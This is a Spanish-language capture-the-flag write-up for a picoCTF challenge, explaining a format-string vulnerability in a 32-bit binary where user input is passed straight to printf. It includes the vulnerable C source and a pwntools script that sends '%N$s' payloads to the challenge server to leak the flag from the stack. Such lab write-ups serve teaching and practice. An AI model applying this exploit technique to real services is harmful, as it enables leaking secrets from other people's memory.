# Flag Leak

```bash
file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID\[sha1]=17bb7adc72aff4022d6a1c451eb9adcf34df2f8c, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols	 No	0	2	vuln
```

El programa devuelve lo que le mandes.

```c
./vuln
Tell me a story and then I'll tell you one >> hola
Here's a story -
hola
```

El código tiene un `printf` sin format strings, con lo cual hay una vulnerabilidad de format strings y podemos hacer un leak del stack, por ejemplo.

```c
void vuln(){
	char flag\[BUFSIZE];
	char story\[128];
	readflag(flag, FLAGSIZE);
	printf("Tell me a story and then I'll tell you one >> ");
	scanf("%127s", story);
	printf("Here's a story - \n");
	printf(story); // VULN
	printf("\n");
}
```

Como la flag se pone en el stack por el `fgets`, podemos hacer un leak de la flag.

```c
void readflag(char* buf, size_t len) {
    FILE *f = fopen("flag.txt", "r");

    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n");
        exit(0);
    }
    fgets(buf, len, f); // FLAG AL STACK
}
```

Podemos hacer un código que sea un `fuzzer` que haga fuzz y saque del elemento 10 al 30, por ejemplo, como string:

```python
from pwn import *

exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 62385)
    return r

def main():
    for i in range(10, 30):
        try:
            r = conn()
            r.sendlineafter(b'>', '%{}$s'.format(i).encode())
            r.recvline()
            result = r.recvline()
            print(result)
            r.close()
        except EOFError:
            pass

if __name__ == "__main__":
    main()
```

Se abrirán y cerrarán conexiones mostrando en cada una un elemento diferente del stack, y uno de esos elementos será la flag.

```c
\[+] Opening connection to saturn.picoctf.net on port 62385: Done
b'CTF{SECRETO}\n'
```
